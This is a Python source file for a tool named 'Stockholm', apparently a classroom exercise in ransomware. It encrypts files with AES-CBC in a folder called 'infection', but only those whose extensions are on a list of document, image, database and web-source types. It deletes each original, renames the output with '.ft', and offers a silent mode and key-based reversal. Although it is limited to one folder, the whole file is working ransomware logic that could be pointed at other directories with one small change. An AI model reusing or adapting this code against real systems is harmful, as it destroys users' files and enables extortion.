import os
import sys
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
import argparse
from colorama import Fore, Back, Style


VERSION = "1.0"
KEY_FILE = "encryption_key.data"
IV_LENGTH = 16
KEY_LENGTH = 16
BLOCK_SIZE = 16
INFECTED_FOLDER = os.path.join(os.path.expanduser("~"), "infection")
AFFECTED_EXTENSIONS = ['.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.jpg', '.png', '.bmp', '.tif', '.dbf', '.sql', '.mdb', '.sln', '.php', '.asp', '.aspx', '.html', '.xml', '.psd']

def encrypt_file(filename, key, silent=False):
    if filename.endswith('.ft'):
        if not silent:
            print(Fore.RED + f"File {filename} already encrypted." + Fore.RESET)
        return # Don't encrypt an already encrypted file

    if not any(filename.endswith(ext) for ext in AFFECTED_EXTENSIONS):
        print(Fore.GREEN + f"File {filename} not affected." + Fore.RESET)
        return # Don't encrypt files that aren't in the list

    with open(filename, 'rb') as file:
        data = file.read() # Read the contents of the file

    iv = get_random_bytes(IV_LENGTH) # Generate a random IV
    cipher = AES.new(key, AES.MODE_CBC, iv)# Create a cipher object
    encrypted_data = iv + cipher.encrypt(pad(data)) # Add IV to the beginning of the encrypted data
    os.remove(filename)  # Remove original file
    new_filename = filename + '.ft'  # Add .ft extension to filename

    with open(new_filename, 'wb') as file: # Open a new file
        file.write(encrypted_data) # Write encrypted data to a new file

    if not silent: # Don't print anything if silent mode is enabled
        print(Fore.YELLOW + f"Encrypted {filename}" + Fore.RESET)

def decrypt_file(filename, key, silent=False): # Decrypt a file
    base_filename, extension = os.path.splitext(filename)# Split the filename and extension into two variables (base_filename and extension)")

    if not extension == '.ft': # If the file doesn't have the .ft extension, it's not encrypted
        if not silent:
            print(Fore.GREEN + f"File {filename} is not encrypted." + Fore.RESET)
        return

    with open(filename, 'rb') as file: # Open the encrypted file  in read-only mode
        data = file.read() # Read the contents of the encrypted file

    iv = data[:IV_LENGTH] # Get the IV from the beginning of the file (first 16 bytes)
    cipher = AES.new(key, AES.MODE_CBC, iv) # Create a cipher object
    decrypted_data = unpad(cipher.decrypt(data[IV_LENGTH:])) # Decrypt and unpad the data (remove the IV from the beginning of the file)
    new_filename = base_filename  # Remove .ft extension from filename

    with open(new_filename, 'wb') as file: # Open a new file
        file.write(decrypted_data) # Write decrypted data to a new file

    os.remove(filename) # Remove original file (encrypted file)

    if not silent:
        print(Fore.YELLOW + f"Decrypted {filename}" + Fore.RESET)

def pad(data): # Pad data to be a multiple of 16 bytes
    padding_length = BLOCK_SIZE - (len(data) % BLOCK_SIZE) # Calculate the number of bytes that need to be padded
    padding = bytes([padding_length] * padding_length)  # Create padding
    return data + padding # Add padding to the data

def unpad(data): # Remove padding from data
    padding_length = data[-1] # Get the last byte of the data (this is the padding length)
    return data[:-padding_length]   # Remove padding from the data

def process_files(key, action, silent=False): # Encrypt or decrypt all files in the infected folder
    if action == "decrypt" and not os.path.exists(INFECTED_FOLDER): # If the infected folder doesn't exist, there are no infected files
        print(Fore.YELLOW + "No infected files found." + Fore.RESET)  
        sys.exit(0)   

    if not silent:
        print(Fore.BLUE + f"{action.capitalize()}ing files..." + Fore.RESET)

    for root, dirs, files in os.walk(INFECTED_FOLDER): # Walk through the infected folder
        for filename in files: # Loop through all files in the infected folder
            if filename != sys.argv[0]: # Don't encrypt or decrypt the stockholm.py file
                filepath = os.path.join(root, filename)
                if action == "encrypt":
                    encrypt_file(filepath, key, silent)
                else:
                    decrypt_file(filepath, key, silent)
                    
def store_key(key): # Store the encryption key in a file
    with open(KEY_FILE, "wb") as f:
         f.write(key)
         print(Fore.BLUE + "Encryption key stored in " + KEY_FILE + Fore.RESET)

def retrieve_key():  # Retrieve the encryption key from a file
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "rb") as f:
            print(Fore.CYAN + "Encryption key retrieved from " + KEY_FILE + Fore.RESET)
            return f.read()


def main():
    parser = argparse.ArgumentParser(description='Stockholm - File Encryption/Decryption Tool')
    parser.add_argument('-r', metavar='key', help='Revert encryption using the encryption key')
    parser.add_argument('-v', action='store_true', help='Display version information')
    parser.add_argument('-s', action='store_true', help='Silent mode (no output)')
    args = parser.parse_args()

    if args.v:
        print(Fore.CYAN + f"Stockholm version {VERSION}" + Fore.RESET)
        sys.exit(0)

    silent = args.s

    if not args.r: 
        # Encrypt  
        password = input(Fore.LIGHTGREEN_EX + "Enter your password: " + Fore.RESET)
        while len(password) != 16:
            print(Fore.RED + "Key must be 16 characters long. Try again" + Fore.RESET)    
            password = input(Fore.LIGHTGREEN_EX + "Enter your password (at least 16 characters): " + Fore.RESET)

        key = password.encode()[:KEY_LENGTH]  
        action = "encrypt"     
        store_key(key)
        
    else:     
        # Decrypt      
        decryption_key = args.r.encode() 
        
        encryption_key = retrieve_key()
        
        while decryption_key != encryption_key:
            print(Fore.LIGHTMAGENTA_EX + "Incorrect decryption key! Try again" + Fore.RESET)    
            decryption_key = input(Fore.LIGHTGREEN_EX + "Enter your password: " + Fore.RESET).encode()
            
        key = decryption_key
        action = "decrypt"
        os.remove(KEY_FILE) # Remove the encryption key file
    process_files(key, action, silent)

if __name__ == "__main__":
    main()